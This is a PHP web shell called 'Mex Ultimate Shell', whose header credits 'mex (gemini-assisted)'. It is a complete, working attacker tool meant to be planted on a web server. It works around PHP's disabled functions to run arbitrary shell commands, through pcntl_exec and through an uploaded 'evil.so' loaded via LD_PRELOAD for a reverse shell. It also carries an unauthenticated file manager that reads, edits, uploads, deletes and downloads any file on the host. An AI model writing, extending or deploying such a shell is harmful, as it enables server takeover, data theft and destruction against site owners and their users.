<?php
/*
    Mex Ultimate Shell (PHP 5.2 Compatible)
    Merges command execution bypasses with a full file manager.
    Author: mex (gemini-assisted)
*/

@error_reporting(0);
@set_time_limit(0);

// --- Basic Info & Function Checks (PHP 5.2 Compatible) ---
$uname = php_uname();
$whoami_name = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid()) : array('name' => get_current_user());
$whoami_name = $whoami_name['name'];
$current_path = str_replace('\\', '/', dirname(__FILE__));
$disabled_functions_str = ini_get('disable_functions');
$disabled_functions_arr = empty($disabled_functions_str) ? array() : array_map('trim', explode(',', $disabled_functions_str));

// --- Bypass Detection ---
$bypasses = array(
    'ld_preload' => false,
    'pcntl' => false
);
if (!in_array('putenv', $disabled_functions_arr) && function_exists('mail')) {
    $bypasses['ld_preload'] = true;
}
if (function_exists('pcntl_exec')) {
    $bypasses['pcntl'] = true;
}

// --- File Manager Path Logic ---
function get_fm_path() {
    $path = str_replace('\\', '/', dirname(__FILE__));
    if (isset($_GET['path'])) {
        $requested_path = $_GET['path'];
        $real_path = realpath($requested_path);
        if ($real_path !== false && is_dir($real_path)) {
            $path = str_replace('\\', '/', $real_path);
        }
    }
    return $path;
}
$fm_path = get_fm_path();

// --- Action Handling ---
$output = '';
$fm_message = '';

// CMD Execution Actions
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $cmd = $_POST['cmd'];

    if ($action === 'pcntl' && $bypasses['pcntl']) {
        $output_file = '/tmp/mex_output.txt';
        $full_cmd = $cmd . ' > ' . $output_file . ' 2>&1';
        pcntl_exec('/bin/sh', array('-c', $full_cmd));
        sleep(1);
        if (file_exists($output_file)){
            $output = file_get_contents($output_file);
            unlink($output_file);
        }
    }

    if ($action === 'ld_preload' && $bypasses['ld_preload']) {
        if (isset($_FILES['payload'])) {
            $so_path = '/tmp/evil.so';
            if (move_uploaded_file($_FILES['payload']['tmp_name'], $so_path)) {
                putenv("LD_PRELOAD=" . $so_path);
                mail("a@a.com", "", "", "");
                $output = "LD_PRELOAD payload uploaded to $so_path and mail() triggered.\nCheck your reverse shell.";
            } else {
                $output = "Failed to upload .so payload.";
            }
        }
    }
}

// File Manager Write Actions
$redirect_url = '?page=fm&path='.urlencode($fm_path);

if (isset($_POST['newfile']) && isset($_POST['filename'])) {
    $new_path = $fm_path . '/' . basename($_POST['filename']);
    if (!file_exists($new_path)) {
        touch($new_path);
        $fm_message = "File created: " . htmlspecialchars($_POST['filename']);
    } else {
        $fm_message = "Error: File already exists.";
    }
    header('Location: ' . $redirect_url . '&msg=' . urlencode($fm_message)); exit;
}

if (isset($_POST['newdir']) && isset($_POST['dirname'])) {
    $new_path = $fm_path . '/' . basename($_POST['dirname']);
    if (!file_exists($new_path)) {
        mkdir($new_path);
        $fm_message = "Directory created: " . htmlspecialchars($_POST['dirname']);
    } else {
        $fm_message = "Error: Directory already exists.";
    }
    header('Location: ' . $redirect_url . '&msg=' . urlencode($fm_message)); exit;
}

if (isset($_POST['rename']) && isset($_POST['newname'])) {
    $rename_path = $_POST['rename'];
    $new_name = $_POST['newname'];
    $dir = dirname($rename_path);
    $new_path = $dir . '/' . basename($new_name);
    if (file_exists($rename_path) && !file_exists($new_path)) {
        if (rename($rename_path, $new_path)) {
            $fm_message = "Renamed successfully";
        } else {
            $fm_message = "Error: Could not rename.";
        }
    } else {
        $fm_message = "Error: Source not found or destination already exists.";
    }
    header('Location: ' . $redirect_url . '&msg=' . urlencode($fm_message)); exit;
}

if (isset($_POST['edit_file'])) {
    $edit_path = $_POST['path'];
    $content = $_POST['content'];
    if (is_file($edit_path) && is_writable($edit_path)) {
        file_put_contents($edit_path, $content);
        $fm_message = "File saved successfully.";
    } else {
        $fm_message = "Error: Could not save file.";
    }
    header('Location: ' . '?page=edit&path=' . urlencode($edit_path) . '&msg=' . urlencode($fm_message)); exit;
}

if (isset($_FILES['upload_file'])) {
    $file = $_FILES['upload_file'];
    if ($file['error'] == UPLOAD_ERR_OK) {
        $target_path = $fm_path . '/' . basename($file['name']);
        if (move_uploaded_file($file['tmp_name'], $target_path)) {
            $fm_message = "File uploaded successfully.";
        } else {
            $fm_message = "Error: Could not upload file.";
        }
    }
    header('Location: ' . $redirect_url . '&msg=' . urlencode($fm_message)); exit;
}

// File Manager Read Actions
if (isset($_GET['delete'])) {
    $delete_path = $_GET['delete'];
    $parent_path = dirname($delete_path);
    if (is_dir($delete_path)) {
        if (rmdir($delete_path)) $fm_message = "Directory deleted.";
        else $fm_message = "Error: Could not delete directory.";
    } else {
        if (unlink($delete_path)) $fm_message = "File deleted.";
        else $fm_message = "Error: Could not delete file.";
    }
    header('Location: ' . '?page=fm&path=' . urlencode($parent_path) . '&msg=' . urlencode($fm_message)); exit;
}

if (isset($_GET['download'])) {
    $dl_path = $_GET['download'];
    if (is_file($dl_path) && is_readable($dl_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl_path).'"');
        header('Content-Length: ' . filesize($dl_path));
        readfile($dl_path);
        exit;
    }
}

// --- Helper Functions (File Manager) ---
function filesize_convert($bytes) {
    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    for ($i = 0; $bytes >= 1024 && $i < (count($label) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $label[$i]);
}

function get_dir_list($path) {
    if (!is_dir($path) || !is_readable($path)) return array();
    $dir = scandir($path);
    $files = array();
    foreach ($dir as $d) {
        if ($d == '.') continue;
        $p = $path . '/' . $d;
        $is_file = is_file($p);
        $files[] = array(
            'name' => $d,
            'path' => $p,
            'is_dir' => is_dir($p),
            'is_file' => $is_file,
            'size' => $is_file ? filesize_convert(filesize($p)) : '--',
            'modified' => date("M d Y H:i:s", filemtime($p)),
            'perms' => substr(sprintf('%o', fileperms($p)), -4),
        );
    }
    return $files;
}

// --- Start HTML ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>Mex Ultimate Shell (PHP 5.2)</title>
    <style>
        body { background: #1e1e1e; color: #d4d4d4; font-family: 'Consolas', monospace; margin: 0; }
        .container { width: 95%; margin: 20px auto; padding: 20px; background: #252526; border: 1px solid #333; }
        h1, h2, h3 { color: #4e9a06; border-bottom: 1px solid #4e9a06; padding-bottom: 5px; }
        .info-bar { background: #333; padding: 10px; margin-bottom: 20px; font-size: 14px; word-wrap: break-word; }
        .info-bar strong { color: #8ae234; }
        .tabs { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
        .tab { padding: 10px 15px; cursor: pointer; background: #333; margin-right: 5px; }
        .tab.active { background: #252526; border-top: 2px solid #4e9a06; }
        .page-content { display: none; }
        .page-content.active { display: block; }
        pre { background: #111; padding: 15px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; font-size: 14px; }
        input, textarea, button, select { background: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 8px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
        button, input[type=submit] { cursor: pointer; background: #4e9a06; color: #111; font-weight: bold; width: auto; padding: 8px 15px;}
        table { border-collapse: collapse; width: 100%; font-size: 14px; } th, td { padding: 8px; text-align: left; border-bottom: 1px solid #444; } a { color: #3e9fce; text-decoration: none; } a:hover { text-decoration: underline; }
        .message { padding: 10px; margin-bottom: 15px; border: 1px solid; } .msg-success { background: #d4edda; color: #155724; } .msg-error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
<div class="container">
    <h1>Mex Ultimate Shell</h1>
    <div class="info-bar">
        <strong>Uname:</strong> <?php echo $uname; ?><br>
        <strong>User:</strong> <?php echo $whoami_name; ?><br>
        <strong>PHP:</strong> <?php echo phpversion(); ?><br>
        <strong>Disable Functions:</strong> <span style="color: #ff8888;"><?php echo empty($disabled_functions_str) ? 'None' : $disabled_functions_str; ?></span>
    </div>

    <div class="tabs">
        <div class="tab" onclick="showPage('cmd')">Command</div>
        <div class="tab" onclick="showPage('fm')">File Manager</div>
        <div class="tab" onclick="showPage('info')">Bypass Info</div>
    </div>

    <div id="page-cmd" class="page-content">
        <h2>Command Execution</h2>
        <?php if (!$bypasses['ld_preload'] && !$bypasses['pcntl']): ?>
            <p>No common command execution bypasses detected.</p>
        <?php else:
            if ($bypasses['ld_preload']):
            ?><div class="bypass-section"><h3>LD_PRELOAD Bypass</h3><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="ld_preload"><label>Upload evil.so:</label><input type="file" name="payload" required><button type="submit">Trigger</button></form><p><strong>Note:</strong> Best for reverse shells. Output will not be shown here.</p></div>
            <?php endif; ?>
            <?php if ($bypasses['pcntl']):
            ?><div class="bypass-section"><h3>pcntl_exec Bypass</h3><form method="POST"><input type="hidden" name="action" value="pcntl"><label>Command:</label><input type="text" name="cmd" placeholder="ls -la" required><button type="submit">Execute</button></form></div>
            <?php endif; ?>
        <?php endif; ?>
        <?php if (!empty($output)):
        ?><h2>Output</h2><pre><?php echo htmlspecialchars($output); ?></pre><?php endif; ?>
    </div>

    <div id="page-fm" class="page-content">
        <h2>File Manager</h2>
        <?php if (isset($_GET['msg'])): ?><div class="message <?php echo strpos($_GET['msg'], 'Error') === false ? 'msg-success' : 'msg-error'; ?>"><?php echo htmlspecialchars($_GET['msg']); ?></div><?php endif; ?>
        <h3>Path: <?php $parts = explode('/', trim($fm_path, '/')); $built = ''; foreach($parts as $part){ if(empty($part)) continue; $built .= '/'.$part; echo '<a href="?page=fm&path='.urlencode($built).'">'.htmlspecialchars($part).'</a>/'; } ?></h3>
        <p><a href="?page=fm&path=<?php echo urlencode(dirname($fm_path)); ?>">[&larr; Up]</a> <a href="?page=fm&path=<?php echo urlencode($current_path); ?>">[Home]</a></p>
        <table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr>
        <?php $dir_list = get_dir_list($fm_path); foreach ($dir_list as $item): if($item['name'] == '..') continue; ?>
        <tr><td><?php echo $item['is_dir'] ? '&#128193;' : '&#128221;'; ?> <a href="<?php echo $item['is_dir'] ? '?page=fm&path='.urlencode($item['path']) : '?page=edit&path='.urlencode($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a></td><td><?php echo $item['size']; ?></td><td><?php echo $item['modified']; ?></td><td><?php echo $item['perms']; ?></td><td><a href="?page=edit&path=<?php echo urlencode($item['path']); ?>">E</a> <a href="?page=fm&delete=<?php echo urlencode($item['path']); ?>" onclick="return confirm('Sure?');">D</a> <a href="?download=<?php echo urlencode($item['path']); ?>">DL</a></td></tr>
        <?php endforeach; ?>
        </table>
        <hr><h3>Actions</h3>
        <form method="POST" style="display:inline-block;"><input type="hidden" name="path" value="<?php echo $fm_path; ?>"><label>New File:</label><input type="text" name="filename" style="width:150px;"><input type="submit" name="newfile" value="Create"></form>
        <form method="POST" style="display:inline-block;"><input type="hidden" name="path" value="<?php echo $fm_path; ?>"><label>New Dir:</label><input type="text" name="dirname" style="width:150px;"><input type="submit" name="newdir" value="Create"></form>
        <form method="POST" enctype="multipart/form-data" style="display:inline-block;"><input type="hidden" name="path" value="<?php echo $fm_path; ?>"><label>Upload:</label><input type="file" name="upload_file" style="width:200px;"><input type="submit" value="Upload"></form>
    </div>

    <div id="page-info" class="page-content">
        <h2>Bypass Information</h2>
        <details><summary>C Code for LD_PRELOAD Payload (evil.so)</summary><pre><code>// See previous shell for C code example. Compile for target architecture (32/64 bit).</code></pre></details>
    </div>

    <?php if (isset($_GET['page']) && $_GET['page'] == 'edit'): $edit_path = $_GET['path']; if(is_file($edit_path) && is_readable($edit_path)): ?>
    <div id="page-edit" class="page-content active">
        <h2>Edit File: <?php echo htmlspecialchars(basename($edit_path)); ?></h2>
        <?php if (isset($_GET['msg'])): ?><div class="message msg-success"><?php echo htmlspecialchars($_GET['msg']); ?></div><?php endif; ?>
        <form method="POST"><input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_path); ?>"><textarea name="content" style="height:400px;font-size:14px;"><?php echo htmlspecialchars(file_get_contents($edit_path)); ?></textarea><button type="submit" name="edit_file">Save Changes</button></form>
    </div>
    <?php else: echo '<h2>Error: File not found or not readable.</h2>'; endif; endif; ?>

</div>
<script>
    function showPage(pageName) {
        var i, pages, tabs;
        pages = document.getElementsByClassName('page-content');
        for (i = 0; i < pages.length; i++) { pages[i].style.display = 'none'; pages[i].className = pages[i].className.replace(' active', ''); }
        tabs = document.getElementsByClassName('tab');
        for (i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(' active', ''); }
        document.getElementById('page-' + pageName).style.display = 'block';
        document.getElementById('page-' + pageName).className += ' active';
        document.querySelector('.tab[onclick="showPage(\'' + pageName + '\')"]').className += ' active';
    }
    var initialPage = '<?php echo (isset($_GET["page"]) && in_array($_GET["page"], array("cmd", "fm", "info", "edit"))) ? $_GET["page"] : "cmd"; ?>';
    showPage(initialPage);
</script>
</body>
</html>
